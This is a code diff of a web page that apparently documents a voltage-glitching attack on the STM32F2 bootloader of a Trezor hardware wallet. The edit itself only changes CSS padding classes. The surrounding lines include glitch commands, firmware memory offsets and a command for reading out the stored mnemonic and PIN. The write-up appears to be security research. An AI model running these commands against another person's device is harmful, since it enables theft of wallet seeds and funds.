@@ -219,7 +219,7 @@
 
                                         <p>The level of the voltage supply should slowly rise in comparison to the voltage on the 'V_CAP' line. Furthermore, the voltage output on the 'VCAP' line is delayed approximately '150ms' after the device is powered on. Powering the device and measuring the voltage traces can be done with the command:</p>
 
-                                        <div class="paddingTop0 paddingBottom30 kesenheimer-code">
+                                        <div class="paddingTop0 paddingBottom15 kesenheimer-code">
                                             <pre class="line-numbers-rows">
                                                 <code class="language-php">power-on --rpico /dev/pico-tty-device</code>
                                             </pre>
@@ -291,7 +291,7 @@
 
                                         <p>The following command was used to glitch the 'readmem' command. The parameters '--delay' and '--length' are not necessary at this stage and are ignored.</p>
 
-                                        <div class="paddingTop0 paddingBottom30 kesenheimer-code">
+                                        <div class="paddingTop0 paddingBottom15 kesenheimer-code">
                                             <pre class="line-numbers-rows">
                                                 <code class="language-php">python stm32f2-bootloader-memread-mux.py --rpico /dev/pico-tty-device --length 0 0 --delay 0 0 --target /dev/stm32-tty-device --delay2 105_450 105_800 --length2 10 30 --stage-2</code>
                                             </pre>
@@ -321,7 +321,7 @@
 
                                         <p>The combined attack on a fully locked down target can be executed with the following command:</p>
 
-                                        <div class="paddingTop0 paddingBottom30 kesenheimer-code">
+                                        <div class="paddingTop0 paddingBottom15 kesenheimer-code">
                                             <pre class="line-numbers-rows">
                                                 <code class="language-php">python stm32f2-bootloader-memread-mux.py --rpico /dev/pico-tty-device --length 110 130 --delay 188_900 189_500 --target /dev/stm32-tty-device --delay2 104_900 105_300 --length2 20 40</code>
                                             </pre>
@@ -353,7 +353,7 @@
 
                                         <p>By analyzing the <a href="https://github.com/trezor/trezor-firmware/tree/legacy/v1.6.1">firmware of the device</a>, the following memory offsets were found:</p>
 
-                                        <div class="paddingTop0 paddingBottom30 kesenheimer-code">
+                                        <div class="paddingTop0 paddingBottom15 kesenheimer-code">
                                             <pre class="line-numbers-rows">
                                                 <code class="language-php">
 FLASH_BOOT_START = 0x08000000
@@ -368,7 +368,7 @@ STORAGE_ROM = FLASH_STORAGE_START + sizeof(storage_magic) + sizeof(storage_uuid)
 
                                         <p>Therefore, the mnemonic passphrase should be around memory offset '0x08008190', and the PIN around '0x08008290'. Hence, we need to perform two memory reads with 256 Bytes each starting from '0x08008190' to extract all secrets. This can be achieved by the following command:</p>
 
-                                        <div class="paddingTop0 paddingBottom30 kesenheimer-code">
+                                        <div class="paddingTop0 paddingBottom15 kesenheimer-code">
                                             <pre class="line-numbers-rows">
                                                 <code class="language-php">python stm32f2-bootloader-memread-mux.py --rpico /dev/tty.usbmodem1401 --length 100 150 --delay 195_000 198_000 --target /dev/tty.usbmodem1303 --delay2 105_000 106_000 --length2 10 50 --address 0x08008190 --size 0x1fe
                                                 </code>
